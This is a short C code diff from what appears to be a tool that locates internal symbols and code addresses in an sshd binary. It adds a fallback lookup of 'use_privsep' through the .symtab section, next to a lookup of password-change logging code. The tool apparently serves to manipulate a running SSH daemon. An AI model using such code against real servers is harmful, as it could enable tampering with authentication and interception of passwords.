@@ -217,6 +217,18 @@ int main(int argc, char *argv[]) {
 
 	// oboi, what a mess
 	use_privsep = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "use_privsep");
+	
+	// If dynsym lookup failed, try symtab
+	if (use_privsep == ctx->elf_base) {
+		symtab_sz = get_section(sshd_path, ".symtab", &symtab);
+		strtab_sz = get_section(sshd_path, ".strtab", &strtab);
+		
+		if (symtab == 0 || strtab == 0)
+			error("could not find symtab.\n");
+
+		use_privsep = ctx->elf_base + resolve_symbol(symtab, symtab_sz, (char*)strtab, "use_privsep");
+	}
+	
 	info("found use_privsep\t\t= 0x%llx", use_privsep);
 
 	logit_passchange = lea_by_debugstr(ctx, LEA_RDI, "password change not supported");
